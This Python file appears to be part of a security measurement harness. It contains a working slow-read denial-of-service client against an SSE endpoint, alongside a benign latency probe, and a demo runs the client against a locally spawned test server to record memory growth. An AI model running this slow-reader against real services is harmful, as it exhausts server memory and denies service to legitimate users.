"""
Slow-SSE / slow-read attacker (CWE-400) and benign-probe helpers, vector 6.

The "attack" is a client that completes the HTTP handshake for a GET /sse
connection and then simply never reads the response body -- no special
tooling needed, this is standard TCP flow control doing the work: once the
OS-level socket buffers fill because nobody drains them, the server's
in-process write buffer (Node's `res.writableLength`) keeps growing for
every `write()` the server issues (see servers/ts_sse_server.mjs, which
pushes PUSH_MB of notification traffic to every new connection).
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import socket
import sys
import time


def open_slow_reader(host: str, port: int, path: str = "/sse", connect_timeout_s: float = 5.0):
    """Opens a raw TCP connection, sends a minimal GET request, reads only
    the response headers, and then deliberately stops reading -- the
    socket is returned still open so the caller can hold it for as long
    as desired while the server keeps writing into its send buffer."""
    s = socket.create_connection((host, port), timeout=connect_timeout_s)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Accept: text/event-stream\r\nConnection: keep-alive\r\n\r\n")
    s.sendall(req.encode())
    s.settimeout(connect_timeout_s)
    buf = b""
    try:
        while b"\r\n\r\n" not in buf and len(buf) < 65536:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    # from here on: NEVER call recv() again -- that is the whole attack.
    return s, buf


def benign_sse_probe(host: str, port: int, n: int = 3, timeout_s: float = 3.0):
    """A well-behaved client: connects, reads the first bytes of the
    response (time-to-first-byte), then disconnects immediately. Returns
    (latencies_ms, error_rate), same contract as the other probes."""
    latencies = []
    errors = 0
    for _ in range(n):
        t0 = time.perf_counter()
        try:
            s = socket.create_connection((host, port), timeout=timeout_s)
            req = (f"GET /sse HTTP/1.1\r\nHost: {host}:{port}\r\n"
                   f"Accept: text/event-stream\r\nConnection: close\r\n\r\n")
            s.sendall(req.encode())
            s.settimeout(timeout_s)
            data = s.recv(4096)
            dt = (time.perf_counter() - t0) * 1000
            ok = data.startswith(b"HTTP/1.1 200")
            s.close()
        except OSError:
            dt = (time.perf_counter() - t0) * 1000
            ok = False
        latencies.append(dt)
        if not ok:
            errors += 1
    return latencies, (errors / n if n else 0.0)


def _standalone_demo():
    """Spawns its own throwaway TypeScript SSE server, opens one slow
    reader against it, holds it for a few seconds, and prints RSS before/
    after via psutil -- a standalone demonstration independent of the
    measurement driver's more careful sampling."""
    import psutil

    root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    node = shutil.which("node") or "node"
    server_script = os.path.join(root, "servers", "ts_sse_server.mjs")
    env = os.environ.copy()
    env.setdefault("PUSH_MB", "10")
    proc = subprocess.Popen([node, server_script, "8899"], env=env,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    time.sleep(1.0)
    p = psutil.Process(proc.pid)
    before = p.memory_info().rss / (1024 * 1024)
    s, _ = open_slow_reader("127.0.0.1", 8899)
    time.sleep(3.0)
    after = p.memory_info().rss / (1024 * 1024)
    print(json.dumps({"rss_before_mb": round(before, 2), "rss_after_mb": round(after, 2)}))
    s.close()
    proc.kill()


if __name__ == "__main__":
    _standalone_demo()
